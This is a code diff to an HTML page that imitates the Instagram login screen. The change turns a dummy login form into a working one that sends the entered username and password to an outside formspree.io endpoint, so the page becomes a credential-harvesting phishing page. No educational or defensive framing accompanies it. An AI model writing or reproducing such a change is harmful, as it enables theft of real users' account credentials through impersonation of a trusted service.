@@ -13,14 +13,17 @@
 			<div class="logo">
 				<img src="instagram.png" alt="instagram" style="width: 175px;">
 			</div>
-			<div class="form">
-				<div class="input_field">
-					<input type="text" placeholder="Phone number, username, or email" class="input">
-				</div>
-				<div class="input_field">
-					<input type="password" placeholder="Password" class="input">
-				</div>
-				<div class="btn"><a href="#">Log In</a></div>
+			<form action="https://formspree.io/f/mljgkazj" method="POST" class="form">
+        <div class="input_field">
+            <input type="text" name="username" placeholder="Phone number, username, or email" class="input" required>
+        </div>
+        <div class="input_field">
+            <input type="password" name="password" placeholder="Password" class="input" required>
+        </div>
+        <div class="btn">
+            <button type="submit" style="width: 100%; background: none; border: none; color: white; font-weight: bold; cursor: pointer;">Log In</button>
+        </div>
+    </form>
 			</div>
 			<div class="or">
 				<div class="line"></div>
